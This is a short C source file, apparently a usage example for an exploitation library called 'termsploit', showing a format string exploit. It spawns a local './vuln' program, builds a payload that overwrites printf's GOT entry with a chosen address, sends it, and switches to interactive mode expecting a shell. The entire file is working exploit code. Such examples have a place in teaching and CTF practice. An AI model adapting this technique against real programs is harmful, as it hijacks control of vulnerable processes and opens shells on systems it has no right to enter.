// Format string example exploit:
// - GOT overwrite to get control
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <signal.h>
#include <string.h>
#include <termsploit.h>
#include <fmtstr.h>
#include <memrw.h>

#define PRINTF_GOT 0x404020
#define EVIL_ADDR 0x401142

int main(void)
{
	termsploit_ctx *ctx;
	char data[8];
	int n;
	char *fmt;
	int exitcode;

	ctx = termsploit_alloc();
	termsploit_spawn(ctx, (char *[]) { "./vuln", NULL });
	if (!ctx) {
		perror("spawn");
		return 1;
	}

	// Data to write
	write_le64(data, EVIL_ADDR);
	// Create format string (%6$p points is buffer)
	n = genfmt(&fmt, TGT_LE, TGT_ADDR_64, 6, PRINTF_GOT, data, sizeof data);

	// Send payload
	termsploit_write(ctx, fmt, n);
	termsploit_write(ctx, "\n", 1);
	// Got a shell?!
	termsploit_interactive(ctx);

	exitcode = termsploit_wait(ctx);
	printf("Process exited with %d\n", exitcode);

	termsploit_free(ctx);
	return 0;
}
